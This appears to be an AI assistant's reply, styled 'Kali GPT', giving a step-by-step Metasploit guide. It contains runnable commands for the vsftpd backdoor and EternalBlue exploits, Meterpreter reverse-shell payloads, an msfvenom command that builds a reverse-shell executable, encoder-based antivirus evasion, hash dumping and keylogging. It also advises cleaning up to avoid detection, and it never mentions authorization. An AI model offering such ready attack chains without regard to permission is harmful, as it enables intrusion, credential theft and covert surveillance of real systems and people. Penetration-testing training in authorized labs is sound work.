Excellent ‚Äî you‚Äôre now asking about **Metasploit**, one of the most essential, powerful, and widely used offensive security frameworks. Let‚Äôs go **all-in, full detail** without skipping a single topic.

---

# üêâ Kali GPT‚Äôs Complete Guide to **Metasploit Framework (MSF)**

---

# üìñ **What is Metasploit?**

Metasploit is a **penetration testing framework** that provides:

* **Exploit modules** to compromise systems.
* **Payloads** to interact with targets.
* **Auxiliary modules** for scanning and enumeration.
* **Post-exploitation modules** for privilege escalation, backdoors, and data exfiltration.
* **Evasion and anti-forensics tools.**
* **Powerful automation via scripts and resource files.**

It is one of the most comprehensive and professional tools in Kali Linux for **offensive security.**

---

# üîß **Metasploit Core Components**

| Component | Purpose                                                          |
| --------- | ---------------------------------------------------------------- |
| Exploits  | Code to leverage specific vulnerabilities                        |
| Payloads  | Code delivered by the exploit (reverse shell, meterpreter, etc.) |
| Auxiliary | Non-exploit features (scanning, fuzzing, DOS)                    |
| Post      | Post-exploitation tools (privilege escalation, pivoting)         |
| Encoders  | Obfuscate payloads to bypass antivirus                           |
| Nops      | Generate ‚Äúno operation‚Äù instructions to pad payloads             |

---

# üöÄ **Metasploit Basics: Starting the Framework**

Start Metasploit:

```bash
msfconsole
```

Or:

```bash
sudo service postgresql start
msfdb init
msfconsole
```

---

# üß≠ **Metasploit Console Navigation**

Key commands:

```bash
search <keyword>        # Search for modules
use <module>            # Select a module
info                    # Get info on selected module
show options            # List required settings
set <option> <value>    # Set module options
run or exploit          # Launch the exploit
```

Example:

```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set RPORT 21
run
```

---

# üî• **Metasploit Module Types**

### 1Ô∏è‚É£ **Exploit Modules**

Used to deliver a payload by exploiting vulnerabilities.
Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

### 2Ô∏è‚É£ **Payload Modules**

Malicious code that runs after exploitation.

Types:

* **Singles:** Standalone payloads (e.g., a reverse shell).
* **Stagers:** Load small payloads that fetch larger payloads.
* **Stages:** Complex payloads like Meterpreter.

Example:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

### 3Ô∏è‚É£ **Auxiliary Modules**

Scanning, fuzzing, and enumeration.
Example:

```bash
use auxiliary/scanner/ftp/anonymous
```

### 4Ô∏è‚É£ **Post Modules**

For privilege escalation, gathering data, and pivoting.
Example:

```bash
use post/multi/gather/hashdump
```

### 5Ô∏è‚É£ **Encoders**

Obfuscate payloads to evade detection.
Example:

```bash
set ENCODER x86/shikata_ga_nai
```

### 6Ô∏è‚É£ **Nops**

Padding used in some exploits.
Example:

```bash
set NOP Sled 16
```

---

# ‚öôÔ∏è **Essential Workflow: Step-by-Step**

### ‚úÖ Step 1: Search Exploit

```bash
search vsftpd
```

### ‚úÖ Step 2: Select Exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### ‚úÖ Step 3: Set Target

```bash
set RHOSTS 192.168.1.100
```

### ‚úÖ Step 4: Set Payload

```bash
set PAYLOAD cmd/unix/interact
```

### ‚úÖ Step 5: Configure Options

```bash
show options
```

Set LHOST (your Kali IP):

```bash
set LHOST 192.168.1.200
```

### ‚úÖ Step 6: Run Exploit

```bash
run
```

---

# üéØ **Payload Examples**

### Windows Reverse TCP Shell

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your IP>
set LPORT 4444
```

### Linux Reverse Shell

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

---

# üõ†Ô∏è **Auxiliary Module Example**

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.100
run
```

üëâ Scans FTP server for anonymous login.

---

# ü¶† **Post-Exploitation Example**

After getting a Meterpreter session:

```bash
sessions
sessions -i 1
```

Dump hashes:

```bash
run post/windows/gather/hashdump
```

---

# üõ°Ô∏è **Meterpreter Cheat Sheet**

| Command           | Purpose                    |
| ----------------- | -------------------------- |
| `sysinfo`         | Show system info           |
| `getuid`          | Show current user          |
| `ps`              | Show running processes     |
| `migrate <PID>`   | Migrate to another process |
| `shell`           | Drop to OS shell           |
| `screenshot`      | Take desktop screenshot    |
| `download <file>` | Download files from target |
| `upload <file>`   | Upload files to target     |
| `keyscan_start`   | Start keylogger            |
| `keyscan_dump`    | Dump keylogger buffer      |
| `webcam_snap`     | Take webcam snapshot       |

---

# üó°Ô∏è **Payload Generation with msfvenom**

Create a Windows reverse shell EXE:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your IP> LPORT=4444 -f exe > shell.exe
```

Start a Metasploit listener:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your IP>
set LPORT 4444
run
```

---

# üìÇ **Useful Database Commands**

Start PostgreSQL:

```bash
sudo service postgresql start
```

List all workspace:

```bash
workspace
```

Save scan results:

```bash
db_nmap -sV 192.168.1.100
```

---

# üõ°Ô∏è **Evasion and Obfuscation**

* Use encoders:

```bash
set ENCODER x86/shikata_ga_nai
```

* Customize payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > shell.exe
```

---

# üîÅ **Automation with Resource Scripts**

You can automate exploits:

```bash
setg RHOSTS 192.168.1.100
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.200
run
```

Save as `script.rc` and run with:

```bash
msfconsole -r script.rc
```

---

# üìä **Output Options**

Log sessions and activity with:

```bash
setg LOG true
```

---

# ‚öôÔ∏è **Advanced Features**

* Pivoting through compromised hosts
* Credential reuse
* Password hash dumping
* Webcam streaming
* Persistence mechanisms
* Antivirus evasion

---

# üîí **Limitations of Metasploit**

* **Very noisy** ‚Üí Easily detected by IDS/AV.
* Requires **open ports** or vulnerable services.
* Payloads often blocked on hardened systems.

---

# üê≤ **Metasploit Best Practice Workflow**

1. Enumerate targets with Nmap and other tools.
2. Search relevant exploits in Metasploit.
3. Use `multi/handler` for payloads.
4. Perform post-exploitation to extract data, pivot, or escalate.
5. Clean up and close sessions to avoid detection.

---

# ‚úÖ Summary Cheat Sheet

| Stage     | Command                                       |
| --------- | --------------------------------------------- |
| Start     | `msfconsole`                                  |
| Search    | `search <keyword>`                            |
| Select    | `use <module>`                                |
| Configure | `set RHOSTS <target>`                         |
| Payload   | `set PAYLOAD windows/meterpreter/reverse_tcp` |
| Run       | `run`                                         |
| Session   | `sessions -i 1`                               |

---
